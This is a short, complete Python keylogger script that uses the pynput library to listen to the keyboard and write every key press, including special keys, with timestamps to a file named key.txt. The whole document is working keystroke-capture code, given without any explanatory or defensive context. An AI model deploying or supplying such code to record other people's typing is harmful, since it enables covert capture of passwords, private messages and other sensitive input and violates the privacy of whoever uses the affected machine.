from pynput import keyboard
import logging
log_dir=''
logging.basicConfig(filename=(log_dir+'key.txt'),level=logging.DEBUG,format="%(asctime)s-%(message)s")
def onPressKey(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key Pressed: {key}")
with keyboard.Listener(on_press=onPressKey) as listener:
    listener.join()